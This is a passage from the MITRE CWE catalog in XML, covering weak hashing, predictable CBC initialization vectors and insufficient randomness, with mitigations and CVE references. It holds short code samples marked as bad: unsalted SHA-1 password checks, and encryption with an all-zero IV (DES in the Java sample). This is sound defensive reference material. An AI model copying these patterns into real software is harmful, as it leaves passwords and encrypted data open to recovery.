	      <Contribution_Comment>Provide a hardware-specific submission whose contents were integrated into this entry, affecting extended description, applicable platforms, demonstrative examples, and mitigations</Contribution_Comment>
	    </Contribution>
            <Previous_Entry_Name Date="2008-04-11">Using a Broken or Risky Cryptographic Algorithm</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="328" Name="Use of Weak Hash" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses an algorithm that produces a digest (output value) that does not meet security expectations for a hash function that allows an adversary to reasonably determine the original input (preimage attack), find another input that can produce the same hash (2nd preimage attack), or find multiple inputs that evaluate to the same hash (birthday attack).</Description>
	 <Extended_Description>
	   <xhtml:p>A hash function is defined as an algorithm that maps arbitrarily sized data into a fixed-sized digest (output) such that the following properties hold:</xhtml:p>
	   <xhtml:ul>
	     <xhtml:li>1. The algorithm is not invertible (also called "one-way" or "not reversible")</xhtml:li>
	     <xhtml:li>2. The algorithm is deterministic; the same input produces the same digest every time</xhtml:li>
	   </xhtml:ul>
	   <xhtml:p>
	     Building on this definition, a cryptographic hash function must also ensure that a malicious actor cannot leverage the hash function to have a reasonable chance of success at determining any of the following:</xhtml:p>
	   <xhtml:ul>
	     <xhtml:li>1. the original input (preimage attack), given only the digest</xhtml:li>
	     <xhtml:li>2. another input that can produce the same digest (2nd preimage attack), given the original input</xhtml:li>
	     <xhtml:li>3. a set of two or more inputs that evaluate to the same digest (birthday attack), given the actor can arbitrarily choose the inputs to be hashed and can do so a reasonable amount of times</xhtml:li>
	   </xhtml:ul>
	   <xhtml:p>What is regarded as "reasonable" varies by context and threat model, but in general, "reasonable" could cover any attack that is more efficient than brute force (i.e., on average, attempting half of all possible combinations). Note that some attacks might be more efficient than brute force but are still not regarded as achievable in the real world.</xhtml:p>
	   <xhtml:p>Any algorithm does not meet the above conditions will generally be considered weak for general use in hashing.</xhtml:p>
	   <xhtml:p>In addition to algorithmic weaknesses, a hash function can be made weak by using the hash in a security context that breaks its security guarantees. For example, using a hash function without a salt for storing passwords (that are sufficiently short) could enable an adversary to create a "rainbow table" [REF-637] to recover the password under certain conditions; this attack works against such hash functions as MD5, SHA-1, and SHA-2.</xhtml:p>
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="326" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="327" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	    <Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-51">
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-101">
               <Intro_Text>In both of these examples, a user is logged in if their given password matches a stored password:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>unsigned char *check_passwd(char *plaintext) {<xhtml:div style="margin-left:1em;">ctext = simple_digest("sha1",plaintext,strlen(plaintext), ... );<xhtml:br/>
                        <xhtml:i>//Login if hash matches stored hash</xhtml:i>
                        <xhtml:br/>if (equal(ctext, secret_password())) {<xhtml:div style="margin-left:1em;">login_user();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String plainText = new String(plainTextIn);<xhtml:br/>MessageDigest encer = MessageDigest.getInstance("SHA");<xhtml:br/>encer.update(plainTextIn);<xhtml:br/>byte[] digest = password.digest();<xhtml:br/>
                     <xhtml:i>//Login if hash matches stored hash</xhtml:i>
                     <xhtml:br/>if (equal(digest,secret_password())) {<xhtml:div style="margin-left:1em;">login_user();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code relies exclusively on a password mechanism (CWE-309) using only one factor of authentication (CWE-308). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (CWE-328).  It also does not use a salt (CWE-759).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	            <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	            <Body_Text>At least one OT product used weak hashes.</Body_Text>
	         </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-30320</Reference>
               <Description>Programmable Logic Controller (PLC) uses a protocol with a cryptographically insecure hashing algorithm for passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30320</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4900</Reference>
               <Description>SHA-1 algorithm is not collision-resistant.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-4900</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-25685</Reference>
               <Description>DNS product uses a weak hash (CRC32 or SHA-1) of the query name, allowing attacker to forge responses by computing domain names with the same hash.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-25685</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-6707</Reference>
               <Description>blogging product uses MD5-based algorithm for passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-6707</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-14855</Reference>
               <Description>forging of certificate signatures using SHA-1 collisions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-14855</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-15999</Reference>
               <Description>mobile app for backup sends SHA-1 hash of password in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-15999</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4068</Reference>
               <Description>Hard-coded hashed values for username and password contained in client-side script, allowing brute-force offline attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4068</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Reversible One-Way Hash</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="461"/>
            <Related_Attack_Pattern CAPEC_ID="68"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-289"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Integrity&#34;, Page 47"/>
            <Reference External_Reference_ID="REF-291"/>
            <Reference External_Reference_ID="REF-292"/>
            <Reference External_Reference_ID="REF-293" Section="5.2 PBKDF2"/>
            <Reference External_Reference_ID="REF-294"/>
            <Reference External_Reference_ID="REF-295"/>
            <Reference External_Reference_ID="REF-296"/>
            <Reference External_Reference_ID="REF-297"/>
            <Reference External_Reference_ID="REF-298"/>
            <Reference External_Reference_ID="REF-637"/>
            <Reference External_Reference_ID="REF-1243"/>
            <Reference External_Reference_ID="REF-1244"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">Since CWE 4.4, various cryptography-related entries including CWE-328 have been slated for extensive research, analysis, and community consultation to define consistent terminology, improve relationships, and reduce overlap or duplication. As of CWE 4.6, this work is still ongoing.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Observed_Example, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Name, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2021-10-28">Reversible One-Way Hash</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="329" Name="Generation of Predictable IV with CBC Mode" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product generates and uses a predictable initialization Vector (IV) with Cipher Block Chaining (CBC) Mode, which causes algorithms to be susceptible to dictionary attacks when they are encrypted under the same key.</Description>
	 <Extended_Description>
	   <xhtml:p>CBC mode eliminates a weakness of Electronic Code
	   Book (ECB) mode by allowing identical plaintext blocks to
	   be encrypted to different ciphertext blocks. This is
	   possible by the XOR-ing of an IV with the initial plaintext
	   block so that every plaintext block in the chain is XOR'd
	   with a different value before encryption. If IVs are
	   reused, then identical plaintexts would be encrypted to
	   identical ciphertexts. However, even if IVs are not
	   identical but are predictable, then they still break the
	   security of CBC mode against Chosen Plaintext Attacks
	   (CPA).</xhtml:p>
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1204" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
			<Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
	      <xhtml:p>CBC mode is a commonly used mode of operation for a
	      block cipher. It works by XOR-ing an IV with the initial
	      block of a plaintext prior to encryption and then
	      XOR-ing each successive block of plaintext with the
	      previous block of ciphertext before encryption.</xhtml:p>
	      <xhtml:div style="margin-left:1em;">
		C_0 = IV<xhtml:br/>
		C_i = E_k{M_i XOR C_{i-1}}
	      </xhtml:div>
	      <xhtml:p>
		When used properly, CBC mode provides security against
		chosen plaintext attacks. Having an unpredictable IV
		is a crucial underpinning of this. See [REF-1171].</xhtml:p>
	      </Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
	       <Note>Designers might assume a non-cryptographic context for a cryptographic variable.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
	       <Note>Developers might dismiss the importance of an unpredictable IV and choose an easier implementation to save effort, weakening the scheme in the process.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>If the IV is not properly initialized, data that is encrypted can be compromised and leak information.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>NIST recommends two methods of generating unpredictable IVs for CBC mode [REF-1172]. The first is to generate the IV randomly. The second method is to encrypt a nonce with the same key and cipher to be used to encrypt the plaintext. In this case the nonce must be unique but can be predictable, since the block cipher will act as a pseudo random permutation.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-143">
               <Intro_Text>In the following examples, CBC mode is used when encrypting data:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>EVP_CIPHER_CTX ctx;<xhtml:br/>char key[EVP_MAX_KEY_LENGTH];<xhtml:br/>char iv[EVP_MAX_IV_LENGTH];<xhtml:br/>RAND_bytes(key, b);<xhtml:br/>memset(iv,0,EVP_MAX_IV_LENGTH);<xhtml:br/>EVP_EncryptInit(&amp;ctx,EVP_bf_cbc(), key,iv);</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class SymmetricCipherTest {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>public static void main() {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>byte[] text ="Secret".getBytes();<xhtml:br/>byte[] iv ={<xhtml:div style="margin-left:1em;">0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00</xhtml:div>};<xhtml:br/>KeyGenerator kg = KeyGenerator.getInstance("DES");<xhtml:br/>kg.init(56);<xhtml:br/>SecretKey key = kg.generateKey();<xhtml:br/>Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");<xhtml:br/>IvParameterSpec ips = new IvParameterSpec(iv);<xhtml:br/>cipher.init(Cipher.ENCRYPT_MODE, key, ips);<xhtml:br/>return cipher.doFinal(inpBytes);</xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>In both of these examples, the initialization vector (IV) is always a block of zeros. This makes the resulting cipher text much more predictable and susceptible to a dictionary attack.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
	 <Observed_Examples>
	   <Observed_Example>
	     <Reference>CVE-2020-5408</Reference>
	     <Description>encryption functionality in an authentication framework uses a fixed null IV with CBC mode, allowing attackers to decrypt traffic in applications that use this functionality</Description>
			    <Link>https://www.cve.org/CVERecord?id=CVE-2020-5408</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2017-17704</Reference>
	     <Description>messages for a door-unlocking product use a fixed IV in CBC mode, which is the same after each restart </Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2017-17704</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2017-11133</Reference>
	     <Description>application uses AES in CBC mode, but the pseudo-random secret and IV are generated using math.random, which is not cryptographically strong.</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2017-11133</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2007-3528</Reference>
	     <Description>Blowfish-CBC implementation constructs an IV where each byte is calculated modulo 8 instead of modulo 256, resulting in less than 12 bits for the effective IV length, and less than 4096 possible IV values.</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2007-3528</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2011-3389</Reference>
	     <Description>BEAST attack in SSL 3.0 / TLS 1.0. In CBC mode, chained initialization vectors are non-random, allowing decryption of HTTPS traffic using a chosen plaintext attack.</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2011-3389</Link>
	   </Observed_Example>
	 </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Cryptography</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Not using a random IV with CBC mode</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Initialization Vectors&#34;, Page 42"/>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-1171"/>
            <Reference External_Reference_ID="REF-1172" Section="Appendix C"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences, Functional_Areas, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Background_Details, Common_Consequences, Demonstrative_Examples, Description, Modes_of_Introduction, Name, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Name, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2021-03-15">Not Using a Random IV with CBC Mode</Previous_Entry_Name>
			<Previous_Entry_Name Date="2021-07-20">Not Using an Unpredictable IV with CBC Mode</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="330" Name="Use of Insufficiently Random Values" Abstraction="Class" Structure="Simple" Status="Stable">
         <Description>The product uses insufficiently random numbers or values in a security context that depends on unpredictable numbers.</Description>
         <Extended_Description>When product generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that will be generated, and use this guess to impersonate another user or access sensitive information.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="804" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Computers are deterministic machines, and as such are unable to produce true randomness. Pseudo-Random Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>When a protection mechanism relies on random values to restrict access to a sensitive resource, such as a session ID or a seed for generating a cryptographic key, then the resource being protected could be accessed by guessing the ID or key.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Other</Impact>
               <Note>If product relies on unique, unguessable IDs to identify a resource, an attacker might be able to guess an ID for a resource that is owned by another user. The attacker could then read the resource, or pre-create a resource with the same ID to prevent the legitimate program from properly sending the resource to the intended user. For example, a product might maintain session information in a file whose name is based on a username. An attacker could pre-create this file for a victim user, then set the permissions so that the application cannot generate the session for the victim, preventing the victim from using the application.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>When an authorization or authentication mechanism relies on random values to restrict access to restricted functionality, such as a session ID or a seed for generating a cryptographic key, then an attacker may access the restricted functionality by guessing the ID or key.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-11.4">
               <Method>Black Box</Method>
               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and look for library functions that indicate when randomness is being used. Run the process multiple times to see if the seed changes. Look for accesses of devices or equivalent resources that are commonly used for strong (or weak) randomness, such as /dev/urandom on Linux. Look for library or system calls that access predictable information such as process IDs and system time.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Man-in-the-middle attack tool</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
